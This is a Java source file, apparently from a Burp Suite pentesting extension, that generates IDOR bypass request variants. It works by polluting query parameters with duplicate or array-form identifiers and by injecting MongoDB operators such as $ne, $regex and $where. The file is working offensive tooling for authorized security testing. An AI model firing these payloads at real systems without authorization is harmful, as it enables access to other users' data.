package com.bypassfuzzer.burp.core.idor.playbooks;

import burp.api.montoya.http.message.requests.HttpRequest;
import com.bypassfuzzer.burp.core.idor.IdorRequestContext;
import java.util.ArrayList;
import java.util.List;

/**
 * PLAYBOOK: idor.query.parameter_pollution
 * Append duplicate identifier parameters in different orders to catch first-wins and last-wins behavior.
 */
public class ParameterPollutionPlaybook implements IdorPlaybook {

    private static final List<String> PARAMETER_NAMES = List.of("id", "accountId");

    @Override
    public String id() {
        return "idor.query.parameter_pollution";
    }

    @Override
    public String displayName() {
        return "Parameter Pollution";
    }

    @Override
    public String description() {
        return "Try duplicate identifier parameters such as id=target&id=authorized in different orders.";
    }

    @Override
    public List<IdorRequestVariant> buildVariants(IdorRequestContext context) {
        HttpRequest targetRequest = context.targetRequest();
        String authorized = context.authorizedIdentifier();
        String target = context.targetIdentifier();
        if (authorized.isEmpty() || target.isEmpty()) {
            return List.of();
        }

        List<IdorRequestVariant> variants = new ArrayList<>();
        for (String parameterName : QueryPlaybookSupport.parameterNames(context, PARAMETER_NAMES)) {
            // 2-param: target request already has param=target; append one
            // more to test first-wins vs last-wins with just 2 values.
            addSingleAppend(variants, targetRequest, parameterName, authorized);

            // 3-param: target request has param=target; append two more in
            // mixed order. Some parsers take the middle value.
            addDoubleAppend(variants, targetRequest, parameterName, authorized, target);
            addDoubleAppend(variants, targetRequest, parameterName, target, authorized);

            // Array notation — APPENDED (pollution: scalar + array coexist):
            addSingleAppend(variants, targetRequest, parameterName + "[]", target);
            addSingleAppend(variants, targetRequest, parameterName + "[]", authorized);
            addSingleAppend(variants, targetRequest, parameterName + "[0]", target);

            // Array notation — REPLACED (scalar removed, only array form present):
            String stripped = com.bypassfuzzer.burp.http.QueryStringUtils.removeParameter(
                targetRequest.path(), parameterName);
            for (String bracketName : List.of(parameterName + "[]", parameterName + "[0]")) {
                String withBracket = com.bypassfuzzer.burp.http.QueryStringUtils.appendDecodedParameter(
                    stripped, bracketName, target);
                variants.add(new IdorRequestVariant(
                    bracketName + "=" + target + " (replaced)",
                    targetRequest.withPath(withBracket)
                ));
            }

            // Indexed array with both IDs — id[0]=target&id[1]=authorized and reversed.
            // Auth might check index 0, resolver might iterate all or take last.
            String idx0 = parameterName + "[0]";
            String idx1 = parameterName + "[1]";
            String base = stripped;
            // target first, authorized second
            String ta = com.bypassfuzzer.burp.http.QueryStringUtils.appendDecodedParameter(
                com.bypassfuzzer.burp.http.QueryStringUtils.appendDecodedParameter(base, idx0, target),
                idx1, authorized);
            variants.add(new IdorRequestVariant(idx0 + "=" + target + "&" + idx1 + "=" + authorized, targetRequest.withPath(ta)));
            // authorized first, target second
            String at = com.bypassfuzzer.burp.http.QueryStringUtils.appendDecodedParameter(
                com.bypassfuzzer.burp.http.QueryStringUtils.appendDecodedParameter(base, idx0, authorized),
                idx1, target);
            variants.add(new IdorRequestVariant(idx0 + "=" + authorized + "&" + idx1 + "=" + target, targetRequest.withPath(at)));

            // NoSQL operator injection via bracket-notation query params.
            // MongoDB/Mongoose parse id[$ne]=value as {id: {$ne: value}}.
            record NosqlOp(String op, String value, String desc) {}
            List<NosqlOp> nosqlOps = List.of(
                new NosqlOp("[$ne]", authorized, "$ne authorized (returns everything else)"),
                new NosqlOp("[$ne]", target, "$ne target"),
                new NosqlOp("[$gt]", "", "$gt empty (greater than nothing = all)"),
                new NosqlOp("[$gte]", "", "$gte empty"),
                new NosqlOp("[$lt]", "zzzzzzz", "$lt high value"),
                new NosqlOp("[$regex]", ".*", "$regex match all"),
                new NosqlOp("[$regex]", target, "$regex target"),
                new NosqlOp("[$in][0]", target, "$in target"),
                new NosqlOp("[$in][0]", authorized, "$in authorized"),
                new NosqlOp("[$nin][0]", authorized, "$nin authorized (not-in = target)"),
                new NosqlOp("[$exists]", "true", "$exists true"),
                new NosqlOp("[$where]", "1", "$where truthy")
            );
            for (NosqlOp op : nosqlOps) {
                String nosqlPath = com.bypassfuzzer.burp.http.QueryStringUtils.appendDecodedParameter(
                    stripped, parameterName + op.op(), op.value());
                variants.add(new IdorRequestVariant(
                    parameterName + op.op() + "=" + op.value() + " (" + op.desc() + ")",
                    targetRequest.withPath(nosqlPath)
                ));
            }
        }
        return variants;
    }

    private static void addSingleAppend(List<IdorRequestVariant> variants,
                                       HttpRequest request,
                                       String parameterName,
                                       String appendValue) {
        String label = "+" + parameterName + "=" + appendValue;
        String updatedPath = com.bypassfuzzer.burp.http.QueryStringUtils.appendDecodedParameter(
            request.path(), parameterName, appendValue
        );
        variants.add(new IdorRequestVariant(
            label + " -> " + com.bypassfuzzer.burp.http.RequestPathUtils.pathWithoutQuery(updatedPath),
            request.withPath(updatedPath)
        ));
    }

    private static void addDoubleAppend(List<IdorRequestVariant> variants,
                                        HttpRequest request,
                                        String parameterName,
                                        String firstValue,
                                        String secondValue) {
        String label = parameterName + "=" + firstValue + " & " + parameterName + "=" + secondValue;
        String updatedPathRequest = request.path();
        updatedPathRequest = com.bypassfuzzer.burp.http.QueryStringUtils.appendDecodedParameter(updatedPathRequest, parameterName, firstValue);
        updatedPathRequest = com.bypassfuzzer.burp.http.QueryStringUtils.appendDecodedParameter(updatedPathRequest, parameterName, secondValue);
        variants.add(new IdorRequestVariant(
            label + " -> " + com.bypassfuzzer.burp.http.RequestPathUtils.pathWithoutQuery(updatedPathRequest),
            request.withPath(updatedPathRequest)
        ));
    }
}
